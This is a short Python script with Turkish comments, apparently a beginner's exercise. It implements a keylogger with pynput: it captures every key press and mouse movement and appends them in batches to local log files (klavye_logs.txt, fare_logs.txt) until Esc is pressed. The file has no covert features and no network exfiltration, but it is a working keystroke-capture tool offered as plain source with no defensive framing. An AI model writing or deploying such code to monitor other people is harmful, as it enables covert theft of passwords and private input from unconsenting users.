from pynput.keyboard import Key, Listener
from pynput.mouse import Controller as MouseController
from pynput.mouse import Listener as MouseListener
import time

# Global değişkenleri tanımladık
count = 0
klavye_girisleri = [] # Klavyeden gelen girişleri alıcak olan
fare_hareketleri = [] # Fare hareketleri

# Klavye tuşuna basıldığında çalışacak olan fonksiyon
def klavye_on_press(tus):
    global klavye_girisleri, count
    klavye_girisleri.append(tus)
    count += 1 #veya kullanım olarak  count = count + 1
    print("{0} tuşuna basıldı".format(str(tus)))

    # Her 10 klavye girişinde belirlediğimiz dosyaya yazıcak olan
    if count >= 10:
        dosyaya_yaz(klavye_girisleri)
        klavye_girisleri = []
        count = 0

# Fare hareketi algılandığında çalışacak olan fonksiyonumuz
def fare_on_move(x, y):
    global fare_hareketleri
    fare_hareketleri.append((x, y))
    
    # Her 10 fare hareketinde belirlediğimiz dosyaya yazılacak olan 
    if len(fare_hareketleri) >= 10:
        fare_hareketlerini_yaz(fare_hareketleri)
        fare_hareketleri = []

# Klavye girişlerini belirlediğimiz dosyaya yazıcak olan fonksiyonumuz
def dosyaya_yaz(girisler):
    with open("klavye_logs.txt", "a") as dosya:
        for giris in girisler:    
            tus = str(giris).replace("'", "")
            if tus.find("space") > 0:
                dosya.write("\n")
            elif tus.find("Key"):
                dosya.write(str(tus))

# Fare hareketlerini belirlediğimizz dosyaya yazıcak olan fonksiyon
def fare_hareketlerini_yaz(hareketler):
    with open("fare_logs.txt", "a") as dosya:
        for hareket in hareketler:
            dosya.write("Fare hareketi: {0}\n".format(str(hareket)))

# Klavyeden veya fareden gelen akışı kesmek için,bir nevi çıkış tuşumuz
def klavye_on_release(tus):
    if tus == Key.esc:
        return False

# Klavyeden gelen veri akışını başlatıyoruz
with Listener(on_press=klavye_on_press, on_release=klavye_on_release) as klavye_dinleyici:
    # Fareden gelen verileri başlatıyoruz
    with MouseListener(on_move=fare_on_move) as fare_dinleyici:
        # Program çalışır durumda olduğu sürece dinleme devam eder
        klavye_dinleyici.join()
